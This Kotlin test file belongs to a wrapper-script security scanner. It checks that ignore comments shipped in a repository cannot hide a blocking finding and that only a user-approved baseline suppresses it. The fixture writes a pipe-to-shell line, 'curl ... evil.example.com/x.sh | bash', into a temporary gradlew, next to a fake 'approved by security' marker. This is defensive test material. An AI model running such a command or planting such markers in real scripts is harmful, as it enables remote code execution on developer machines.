package com.sal7one.wrapperguard.rules

import com.sal7one.wrapperguard.core.model.BaselineEntry
import com.sal7one.wrapperguard.core.model.FindingStatus
import com.sal7one.wrapperguard.core.model.PolicyAction
import com.sal7one.wrapperguard.core.model.ScanVerdict
import com.sal7one.wrapperguard.core.policy.EnforcementMode
import com.sal7one.wrapperguard.core.policy.ScanPolicy
import com.sal7one.wrapperguard.core.policy.ScanSettings
import java.nio.file.Files
import kotlin.io.path.writeText
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertNotEquals
import kotlin.test.assertNotNull
import kotlin.test.assertTrue

/**
 * #5 trusted vs untrusted suppression: repo-shipped wrapperguard:ignore markers are inert;
 * only a trusted external baseline (user-approved fingerprints) marks findings SUPPRESSED.
 */
class UntrustedSuppressionTest {

    private val line = "curl -fsSL https://evil.example.com/x.sh | bash"

    private fun fixture(marker: String?): java.nio.file.Path {
        val root = Files.createTempDirectory("wg-untrusted-suppression")
        val content = if (marker == null) "$line\n" else "$line $marker\n"
        root.resolve("gradlew").writeText("#!/bin/sh\n$content")
        return root
    }

    @Test
    fun repoShippedIgnoreDoesNotSuppressBlocker() {
        val root = fixture("# wrapperguard:ignore approved by security")
        val report = RepositoryScanner().scan(root, ScanPolicy(mode = EnforcementMode.ENFORCE), ScanSettings())
        val blocker = report.findings.firstOrNull { it.ruleId == RuleIds.SUPPLY_PIPE_TO_SHELL }
        assertNotNull(blocker, "untrusted ignore must not hide the finding")
        assertEquals(PolicyAction.BLOCK, blocker.policyAction)
        assertEquals(FindingStatus.ACTIVE, blocker.status)
        assertEquals(ScanVerdict.EXECUTION_BLOCKED, report.verdict)
    }

    @Test
    fun trustedBaselineSuppressesDespiteRepoIgnore() {
        val root = fixture("# wrapperguard:ignore approved by security")
        val first = RepositoryScanner().scan(root, ScanPolicy(mode = EnforcementMode.ENFORCE), ScanSettings())
        val blocker = first.findings.first { it.ruleId == RuleIds.SUPPLY_PIPE_TO_SHELL }

        val baseline = listOf(BaselineEntry(blocker.fingerprint, blocker.ruleId, "user approved"))
        val second = RepositoryScanner().scan(root, ScanPolicy(mode = EnforcementMode.ENFORCE), ScanSettings(), baseline)
        assertEquals(FindingStatus.SUPPRESSED, second.findings.first { it.ruleId == RuleIds.SUPPLY_PIPE_TO_SHELL }.status)
        assertNotEquals(ScanVerdict.EXECUTION_BLOCKED, second.verdict)
    }

    @Test
    fun fingerprintIsStableWhenMarkerIsAdded() {
        val without = RepositoryScanner().scan(fixture(null), ScanPolicy(mode = EnforcementMode.ENFORCE), ScanSettings())
        val with = RepositoryScanner().scan(
            fixture("# wrapperguard:ignore approved by security"),
            ScanPolicy(mode = EnforcementMode.ENFORCE),
            ScanSettings()
        )
        val fp1 = without.findings.first { it.ruleId == RuleIds.SUPPLY_PIPE_TO_SHELL }.fingerprint
        val fp2 = with.findings.first { it.ruleId == RuleIds.SUPPLY_PIPE_TO_SHELL }.fingerprint
        assertEquals(fp1, fp2, "fingerprint must be stable before/after the user adds an ignore marker")
    }
}
